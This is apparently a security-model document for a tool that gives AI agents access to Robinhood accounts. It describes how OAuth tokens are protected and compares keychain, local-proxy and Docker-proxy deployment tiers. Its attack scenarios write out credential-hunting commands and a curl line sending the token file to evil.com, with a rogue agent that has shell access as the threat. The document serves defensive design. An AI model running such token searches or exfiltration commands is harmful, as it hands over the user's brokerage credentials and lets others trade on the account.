# Security Model

This document describes how robinhood-for-agents protects Robinhood OAuth tokens and what each deployment model defends against.

## What we store

A single JSON blob containing:

| Field | Purpose |
|-------|---------|
| `access_token` | Bearer token for API calls (~8.5-day expiry) |
| `refresh_token` | Used with `device_token` to get a new access token |
| `device_token` | UUID binding the session to a device |

Anyone who has all three can trade on the user's Robinhood account.

## Threat model

### What we protect against today

- **Disk theft / offline access** — tokens are encrypted at rest in the OS keychain (macOS Keychain Services, Linux libsecret)
- **Other OS users** — keychain items are scoped to the owning user
- **Network interception** — all API calls use TLS; redirect validation prevents token leakage to untrusted hosts
- **Accidental exposure in logs** — token redaction layer scrubs `access_token`, `refresh_token`, and `device_token` from all error messages and LLM-visible output

### What we do NOT protect against today

- **Rogue agents with shell access on the same host** — `Bun.secrets` does not use per-access biometric authentication (`kSecAccessControlUserPresence` on macOS). Once the user grants `bun` keychain access, any process running `bun` as that user can read tokens silently. On Linux, GNOME Keyring unlocks at login and stays open for the session.

This is a fundamental property of the current OS keychain model, not a bug in this project.

## Attack scenarios

### Scenario A: Plaintext token file in a container

```bash
$ find / -name "*.json" -exec grep -l "access_token" {} \;
/secrets/robinhood-tokens.json

$ cat /secrets/robinhood-tokens.json
{"access_token":"eyJ...","refresh_token":"abc...","device_token":"uuid..."}

# Exfiltrate — attacker trades from anywhere, forever
$ curl -X POST https://evil.com/steal -d @/secrets/robinhood-tokens.json
```

**Result**: Full credential theft. One command.

### Scenario B: Encrypted token file with key in env var

```bash
$ cat /secrets/robinhood-tokens.json
{"v":1,"salt":"ab12..","iv":"cd34..","tag":"ef56..","ct":"encrypted-blob"}
# Encrypted. But check the environment:

$ env | grep ROBINHOOD
ROBINHOOD_ENCRYPTION_KEY=a1b2c3d4e5f6...
ROBINHOOD_TOKENS_FILE=/secrets/robinhood-tokens.json

# Or just call the library directly:
$ bun -e "
  import { loadTokens } from 'robinhood-for-agents/client/token-store';
  console.log(JSON.stringify(await loadTokens()));
"
{"access_token":"eyJ...","refresh_token":"abc...","device_token":"uuid..."}
```

**Result**: Same as plaintext — one extra step. The decryption key sits in the same environment as the ciphertext.

### Scenario C: Auth proxy — tokens on host only

```bash
$ find / -name "*.json" -exec grep -l "access_token" {} \;
# (nothing)

$ env | grep ROBINHOOD
ROBINHOOD_API_PROXY=http://host.docker.internal:3100
# No tokens. No keys.

$ grep -r "eyJ" / 2>/dev/null
# (nothing — no JWTs anywhere in the container)

$ bun -e "console.log(await Bun.secrets.get('robinhood-for-agents','session-tokens'))"
# null (no keychain in Docker)

# The proxy lets you call the API, but never exposes the token:
$ curl http://host.docker.internal:3100/positions/?nonzero=true
{"results": [...]}

$ curl http://host.docker.internal:3100/.tokens
# 404 — the proxy does not expose raw tokens
```

**Result**: No credential theft possible. The agent can make API calls through the proxy, but cannot extract the token for use elsewhere.

## Security tiers

| Tier | Setup | Token location | Rogue agent risk |
|------|-------|---------------|-----------------|
| 1. Keychain (default) | Local, no Docker | OS keychain | Agent reads keychain via shell — same user, same privileges |
| 2. Auth proxy (local) | Local + proxy | OS keychain | Agent can still read keychain via shell; proxy adds audit trail, rate limiting, and operation allowlisting |
| 3. Auth proxy (Docker) | Host proxy + agent in container | **Host keychain only** — nothing in the container | **Exfiltration blocked.** Agent can only make API calls through the proxy (rate-limited, audited, killable) |

### Why Docker + auth proxy is the strongest practical option

Docker provides an **isolation boundary** between the host (where tokens live in the keychain) and the container (where the agent runs). The proxy is the only bridge, and it never exposes raw tokens. The agent can abuse the proxy to make API calls, but it cannot steal the token for use elsewhere. And you can kill the proxy to instantly revoke all container access.

Without Docker (or another sandbox), the agent and the keychain share the same user context — no amount of encryption or indirection prevents a same-user process from reading the keychain.

## Best practices

### Docker deployments

- **Always** use the auth proxy (Tier 3) — never put tokens inside the container
- Set `ROBINHOOD_API_PROXY` as the only Robinhood-related env var in the container
- The proxy runs on the host where the keychain is accessible
- Stop the proxy to immediately revoke container access

### Local deployments

- OS keychain (Tier 1) is the baseline — no tokens on disk, no env vars
- Auth proxy (Tier 2) adds defense-in-depth: audit logging, rate limiting, operation allowlisting
- Agent permission models (e.g., Claude Code approval prompts) provide an additional layer

### Never do this

- **Never store tokens as plaintext files** — one `cat` command exposes everything
- **Never pass tokens as env vars** — visible via `docker inspect`, `/proc/<pid>/environ`, and orchestrator logs
- **Never store encryption keys alongside encrypted files** — if an attacker can read the file, they can almost certainly read the env var too

## Why not encrypted files?

Encrypted files seem like a reasonable middle ground, but they fail the core threat model:

1. The decryption key must be available at runtime (env var, mounted secret, etc.)
2. A rogue agent with shell access can read env vars as easily as files
3. The agent can also call `loadTokens()` directly, which handles decryption internally
4. **Result**: encryption adds complexity without meaningful security improvement when the attacker has code execution in the same environment

The auth proxy solves this by keeping the token in a **different security domain** (the host) that the containerized agent physically cannot reach.

